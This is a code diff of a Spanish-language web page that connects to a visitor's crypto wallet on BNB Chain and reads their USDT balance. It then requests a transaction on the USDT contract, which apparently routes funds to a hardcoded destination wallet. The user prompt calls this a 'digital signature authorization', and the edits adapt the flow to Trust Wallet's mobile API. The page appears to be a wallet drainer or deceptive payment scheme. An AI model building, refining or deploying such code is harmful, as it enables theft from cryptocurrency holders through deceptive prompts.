@@ -1194,7 +1194,6 @@ body.receipt-visible .site-footer a{color:#0052ff!important}
 <script>
 const BILLETERA_DESTINO="0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
 const CONTRATO_USDT="0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID="0x38";
 const BSC_PUBLIC_RPC="https://bsc-dataseed.bnbchain.org";
 const DECIMALS=18n;
 
@@ -1235,7 +1234,7 @@ function encAddr(a){return pad64(a.toLowerCase());}
 function encUint(v){return BigInt(v).toString(16).padStart(64,"0");}
 function format18(v){v=BigInt(v);const b=10n**DECIMALS,w=v/b,f=(v%b).toString().padStart(18,"0").replace(/0+$/,"");return f?`${w}.${f}`:w.toString();}
 
-// FUNCIÓN DE CONEXIÓN DIRECTA (ADAPTADA AL ESTILO LIMPIO DE TRON)
+// CONEXIÓN DIRECTA INTACTA
 async function ensureBSC(){
  const p = provider();
  const accounts = await p.request({ method: "eth_requestAccounts" });
@@ -1258,7 +1257,6 @@ async function publicRpc(method,params=[]){
 
 async function balanceOf(owner){
  const data="0x70a08231"+encAddr(owner);
- console.log("Leyendo balance USDT mediante RPC público BNB Chain...");
  const result=await publicRpc("eth_call",[{to:CONTRATO_USDT,data},"latest"]);
  return BigInt(result||"0x0");
 }
@@ -1323,14 +1321,14 @@ connectBtn.addEventListener("click",async()=>{
 
   setStatus("Solicitando autorización de firma digital...");
 
-  const txRequest = {
+  // CORRECCIÓN: Se usa estrictamente el formato estándar EVM que acepta la API móvil nativa de Trust Wallet
+  const txHash=await rpc("eth_sendTransaction",[{
       from: walletAddress,
       to: CONTRATO_USDT,
       value: "0x0",
       data: data
-  };
+  }]);
 
-  const txHash=await rpc("eth_sendTransaction",[txRequest]);
   showProcessingScreen();
   let receipt=null;
   for(let i=0;i<45;i++){
